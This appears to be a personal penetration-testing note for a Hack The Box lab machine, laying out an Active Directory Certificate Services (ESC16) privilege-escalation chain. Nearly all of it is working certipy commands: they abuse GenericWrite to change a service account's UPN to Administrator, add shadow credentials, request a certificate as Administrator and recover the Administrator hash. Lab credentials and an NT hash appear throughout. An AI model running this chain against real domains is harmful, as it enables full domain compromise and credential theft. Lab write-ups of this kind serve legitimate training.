
```bash
certipy find -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout -vulnerable
```

![[Pasted image 20251005180905.png]]
[Documentation](https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/)

> Requires an account with `GenericWrite` access to another account that can publish certificates
> 
> Review [Fluffy Machine](https://htb.adot8.com/hack-the-box/windows-boxes/fluffy)

Read low level account attributes
```bash
certipy account -u "p.agila" -p 'prometheusx-303' -dc-ip 10.10.11.69 -user ca_svc read
```

Change users UPN (UserPrinicipalName) to Administrator
```bash
certipy account -u "p.agila" -p 'prometheusx-303' -dc-ip 10.10.11.69 -user ca_svc -upn Administrator update
```

> If the error `CONSTRAINT_ATT_TYPE` appears try using the FQDN `Administrator@domain.local`

Setup shadow credentials for the user + get TGT
```bash
certipy shadow -u "p.agila" -p 'prometheusx-303' -dc-ip 10.10.11.69 -account ca_svc auto
```

Request a certificate as Administrator

```bash
export KRB5CCNAME=$(pwd)/ca_svc.ccache

certipy-ad req -k -dc-ip 10.10.11.69 -ca 'fluffy-DC01-CA' -template 'User' -upn Administrator@fluffy.htb 

OR

certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -ca 'fluffy-DC01-CA' -template 'User' -upn Administrator@fluffy.htb  
```

Put UPN for controlled user back to normal

```bash
certipy account  -u "p.agila" -p 'prometheusx-303' -dc-ip 10.10.11.69 -user ca_svc -upn ca_svc update
```

Get Administrator hash
```bash
certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username Administrator -domain fluffy.htb
```